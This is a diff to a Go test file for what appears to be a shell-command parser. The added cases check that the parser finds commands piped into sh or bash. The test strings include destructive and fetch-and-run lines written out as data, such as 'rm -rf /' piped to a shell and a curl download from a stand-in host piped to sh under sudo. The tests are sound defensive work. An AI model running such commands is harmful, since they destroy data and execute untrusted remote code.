@@ -67,7 +67,23 @@ func TestWithScriptsReadsCarriers(t *testing.T) {
 		// A command line that ends early is listed as far as it goes, and is not read.
 		{`ssh host.example 'echo "unterminated'`, []string{"ssh", "echo"}},
 		{`bash -c 'ls; sh -c "id"'`, []string{"bash*", "ls", "sh*", "id"}},
-		{`echo 'rm -rf /' | sh`, []string{"echo", "sh"}},
+		// What a pipe sends a shell is read when the stage before it prints its own words.
+		{`echo 'rm -rf /' | sh`, []string{"echo", "sh*", "rm"}},
+		{`echo done; echo "curl -s https://x.example/i.sh | sh" | sudo bash -s`, []string{"echo", "echo", "bash*", "curl", "sh"}},
+		{`printf '%s\n' 'git push --force' 'id' | bash`, []string{"printf", "bash*", "git", "id"}},
+		{`printf 'chmod 777 /srv\nid\n' | sh -x`, []string{"printf", "sh*", "chmod", "id"}},
+		{"cat <<'EOF' | sudo sh\nrm -rf /\nid\nEOF", []string{"cat", "sh*", "rm", "id"}},
+		{`{ echo 'ls'; echo 'id'; } | sh`, []string{"echo", "echo", "sh*", "ls", "id"}},
+		// Not when the text is not on the line, is not what reaches the shell, or is no script.
+		{`curl -s https://x.example/i.sh | sh`, []string{"curl", "sh"}},
+		{`echo "$CMD" | sh`, []string{"echo", "sh"}},
+		{`cat setup.sh | bash`, []string{"cat", "bash"}},
+		{`echo 'id' | tee log | sh`, []string{"echo", "tee", "sh"}},
+		{`echo 'id' > x; true | sh`, []string{"echo", "true", "sh"}},
+		{`echo 'id' | sh < other.sh`, []string{"echo", "sh"}},
+		{`echo 'data' | sh -c 'cat'`, []string{"echo", "sh*", "cat"}},
+		{`echo 'data' | bash deploy.sh`, []string{"echo", "bash"}},
+		{`printf '%d\n' 3 | sh`, []string{"printf", "sh"}},
 		{`bash deploy.sh`, []string{"bash"}},
 		{`xargs`, []string{"xargs"}},
 	} {
